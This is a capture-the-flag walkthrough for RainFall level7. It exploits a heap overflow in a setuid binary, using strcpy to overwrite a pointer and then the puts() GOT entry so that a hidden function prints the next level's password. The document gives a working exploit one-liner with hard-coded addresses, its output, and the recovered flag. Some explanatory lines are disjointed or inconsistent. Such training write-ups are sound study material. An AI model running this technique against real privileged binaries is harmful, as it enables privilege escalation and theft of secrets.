# 🔑 Level7 Walkthrough

## Step 1: Discovering the binary
When logged in as `level7`, you see:

```bash
level7@RainFall:~$ ls -l
-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
```

- The binary runs with **level8’s privileges** (setuid).  
- Running it with no arguments segfaults, with one argument segfaults, and with two arguments it prints `"~~"`:

```bash
./level7
Segmentation fault (core dumped)

./level7 bla
Segmentation fault (core dumped)

./level7 bla bla
~~
```

So it expects **two arguments**.

---

## Step 2: Looking at the source
From `source.c`:

```c
char c[200];

void m() {
    printf("%s - %d\n", c, (int)time(0));
}

int main (int ac, char ** av) {
    char *ptr;
    char *ptr2;

    ptr = malloc(8);
    *(int *)(&ptr[0]) = 1;
    *(void **)(&ptr[4]) = malloc(8);

    ptr2 = malloc(8);
    *(int *)(&ptr2[0]) = 2;
    *(void **)(&ptr2[4]) = malloc(8);

    strcpy(&ptr[4], av[1]);
    strcpy(&ptr2[4], av[2]);

    fgets(c, 68, fopen("/home/user/level8/.pass", "r"));
    puts("~~");
}
```

Key points:
- Two small heap structures are allocated (`ptr` and `ptr2`), each 8 bytes.  
- Each has a structure like:  
  - first 4 bytes = integer ID (1 or 2)  
  - next 4 bytes = pointer to another malloc’d buffer.  
- Then `strcpy()` is used to copy `argv[1]` into `ptr[4]` (the pointer field of the first struct).  
- Then `strcpy()` is used to copy `argv[2]` into `ptr2[4]`.  
- `strcpy()` is unsafe: it will happily overwrite pointers.  
- There’s a hidden function `m()` that prints the flag contents and the time.  

So the trick is: **use the first `strcpy()` to overwrite the pointer in the second struct, so that the second `strcpy()` writes into a GOT entry.**

---

## Step 3: Strategy
- The second `strcpy()` writes into the address stored in `ptr2[4]`.  
- If we overwrite `ptr2[4]` with the address of a GOT entry, then `strcpy()` will write our second argument into that GOT entry.
- You cannot make a single strcpy both corrupt a pointer AND write a value through that corrupted pointer in the same call. Those are two separate memory write operations:
- If we overwrite the GOT entry for `puts()` with the address of `m()`, then when the program calls `puts("~~")`, it will actually call `m()`.  
- `m()` prints the contents of the password file.  

This is a **heap overflow → GOT overwrite → function hijack**.

---

## Step 4: Finding addresses
- GOT entry for `puts()` is at `0x08049928` (from disassembly of `puts@plt`).  
- Address of `m()` is at `0x080484f4`.  

---

## Step 5: Finding the offset
Using a cyclic pattern and `ltrace`, we see that the overwrite happens after **20 bytes**.  
So after 20 characters in `argv[1]`, we start overwriting `ptr2[4]`.

---

## Step 6: Crafting the payload
Payload structure:
- `argv[1]`: `"A"*20 + address_of_puts_GOT`  
- `argv[2]`: `address_of_m`  

Exploit:

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

---

## Step 7: Exploiting
Running the payload:

```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1606130489
```

We now have the password for **level8**.

---

# ✅ Summary
- Vulnerability: **heap overflow** via `strcpy()` into struct pointers.  
- Goal: overwrite `ptr2[1]` (pointer) to point to `puts()` GOT entry.  
- Then overwrite GOT entry with address of `m()`.  
- When program calls `puts("~~")`, it actually calls `m()`.  
- `m()` prints the flag.  
- Exploit:  
  - `argv[1] = "A"*20 + "\x28\x99\x04\x08"`  
  - `argv[2] = "\xf4\x84\x04\x08"`  
- Result: password for **level8** is revealed.
